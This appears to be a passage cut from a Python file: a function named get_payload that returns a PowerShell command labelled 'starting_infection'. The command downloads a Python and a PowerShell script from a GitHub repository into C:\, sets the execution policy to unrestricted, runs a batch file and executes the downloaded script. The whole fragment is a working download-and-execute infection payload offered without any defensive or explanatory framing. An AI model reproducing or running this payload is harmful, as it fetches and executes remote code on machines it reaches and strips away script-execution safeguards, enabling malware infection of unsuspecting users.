...
def get_payload():
    return r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.ps1'' , ''C:\main.ps1''); Set-ExecutionPolicy unrestricted; cmd.exe /c C:\Windows\main.bat; powershell.exe C:\main.ps1' """
